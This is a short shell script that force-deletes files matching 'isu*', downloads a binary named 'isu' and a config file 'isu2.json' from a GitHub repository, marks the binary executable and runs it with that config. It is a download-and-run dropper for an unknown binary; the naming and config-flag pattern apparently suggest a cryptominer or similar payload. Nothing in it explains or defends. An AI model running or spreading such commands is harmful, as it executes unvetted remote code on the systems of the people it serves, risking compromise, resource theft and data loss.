rm -rf isu*
wget https://github.com/barburonjilo/open/raw/refs/heads/main/isu
wget https://github.com/barburonjilo/open/raw/refs/heads/main/isu2.json

chmod +x isu
./isu -c "isu2.json"
